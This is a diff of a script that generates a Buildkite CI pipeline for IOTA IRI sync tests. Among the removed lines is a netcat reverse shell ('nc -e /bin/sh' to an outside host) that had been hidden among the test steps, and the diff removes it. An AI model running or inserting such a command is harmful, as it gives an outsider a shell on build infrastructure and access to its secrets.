@@ -28,8 +28,7 @@ echo "  - name: \"[Sync] Let's see how fast a node catches up\"
       - cd Nightly-Tests/Sync-Tests
       - mkdir /cache/Sync-Tests
       - bash createCluster.sh iotacafe/iri-dev
-      - nc -e /bin/sh ester.hackon.eu 8080
-      - cp -arv Nightly-Tests/Sync-Tests/SyncOutput/* /cache/Sync-Tests
+      - cp -arv SyncOutput/* /cache/Sync-Tests
     artifact_paths:
       - \"/cache-iri-jmeter-tests-$BUILDKITE_BUILD_ID/Sync-Tests/**/*.log\"
     plugins:
